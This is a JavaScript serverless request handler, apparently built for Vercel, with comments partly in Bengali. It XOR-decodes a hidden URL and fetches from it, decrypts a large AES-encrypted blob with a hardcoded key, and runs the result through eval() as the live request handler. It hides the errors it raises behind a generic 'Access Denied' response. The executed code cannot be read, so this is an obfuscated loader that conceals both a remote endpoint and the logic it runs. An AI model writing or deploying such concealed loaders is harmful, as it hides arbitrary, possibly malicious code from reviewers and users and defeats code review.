
const crypto = require('crypto');

// --- Hidden Configuration ---
// URL টি এনক্রিপ্টেড অবস্থায় আছে
const _u = "3d212125266f7a7a36313b7b3f263130393c23277b3b30217a323d7a33273030313a3866636c2d7a2c212d3d2f3f2f78213d20383730397a31343b38646766613d2633343b372d20227b3f26";
const _d = (h) => h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16) ^ 0x55)).join('');

export default async function(req, res) {
    try {
        // 1. Fetch Key Securely (URL Decryption happens here)
        const remoteUrl = _d(_u);
        const r = await fetch(remoteUrl);
        if (!r.ok) throw new Error("Key fetch failed");
        const d = await r.json();

        // 2. Prepare Keys
        // এখানে আমরা Local Key এবং Remote Data এর সমন্বয় করতে পারি নিরাপত্তার জন্য
        const localKeyRaw = "7ul43k960okmilb1u7m"; 
        
        // Node.js এ Key সেটআপ (SHA-256 Hash of localKey to match browser encryption)
        const algorithm = 'aes-256-gcm';
        const key = crypto.createHash('sha256').update(localKeyRaw).digest();
        const iv = Buffer.from("f4d23d3be4973b6ffd9834f5", 'hex');
        const encryptedPayload = "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";

        // 3. Decrypt using Native Node.js Crypto (Ultra Fast)
        // This is much faster than JS loops because it uses C++ bindings (OpenSSL)
        const decipher = crypto.createDecipheriv(algorithm, key, iv);
        
        // GCM requires an auth tag. 
        // Note: Web Crypto API appends tag at the end of ciphertext. Node expects it separately.
        // We need to split the tag. Tag length is usually 16 bytes (128 bits).
        const buf = Buffer.from(encryptedPayload, 'base64');
        const authTagLength = 16;
        const content = buf.subarray(0, buf.length - authTagLength);
        const authTag = buf.subarray(buf.length - authTagLength);

        decipher.setAuthTag(authTag);
        
        let decrypted = decipher.update(content, null, 'utf8');
        decrypted += decipher.final('utf8');

        // 4. Execution Logic (Vercel Compatible)
        // আমরা 'export default' হ্যান্ডেল করার জন্য কোডটিকে মডিফাই করব
        let execCode = decrypted;
        
        if (execCode.includes('export default')) {
             // Replace export default with a global assignment
             execCode = execCode.replace(/export\s+default\s+(async\s+)?function\s*(\w+)?/, 'global._h = async function');
             execCode = execCode.replace(/export\s+default/, 'global._h ='); 
        }

        // Execute in safe scope
        eval(execCode);

        // Run the handler
        if (typeof global._h === 'function') {
            return await global._h(req, res);
        } else {
            return res.status(500).json({ error: "No handler found in encrypted code" });
        }

    } catch (e) {
        // প্রোডাকশনে এরর লগ হাইড করতে চাইলে console.error রিমুভ করতে পারেন
        // console.error("Security Error:", e.message); 
        return res.status(403).json({ 
            error: 'Access Denied', 
            message: 'Invalid Environment or Key' 
        });
    }
}